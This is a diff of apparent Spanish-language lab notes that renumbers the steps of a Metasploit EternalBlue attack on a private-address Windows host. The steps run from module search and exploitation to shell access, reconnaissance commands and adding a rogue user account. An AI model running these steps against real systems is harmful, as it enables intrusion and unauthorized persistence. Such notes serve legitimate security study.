@@ -117,7 +117,7 @@ Host script results:
 Resultado:
 msf >
 
-search eternalblue
+8 search eternalblue
 
    #   Name                                           Disclosure Date  Rank     Check  Description
    -   ----                                           ---------------  ----     -----  -----------
@@ -156,21 +156,21 @@ search eternalblue
 Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
 After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
 
-8 use 0
+9 use 0
 
-9 show options
+10 show options
 
-10 set RHOST 10.0.0.181
+11 set RHOST 10.0.0.181
 
-11 exploit
-12 shell
+12 exploit
+13 shell
 
-13 whoami
+14 whoami
 
-14 net user
-15 net localgroup
-16 ipconfig
-17 net user (nombre) (contra) /add
+15 net user
+16 net localgroup
+17 ipconfig
+18 net user (nombre) (contra) /add
 
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
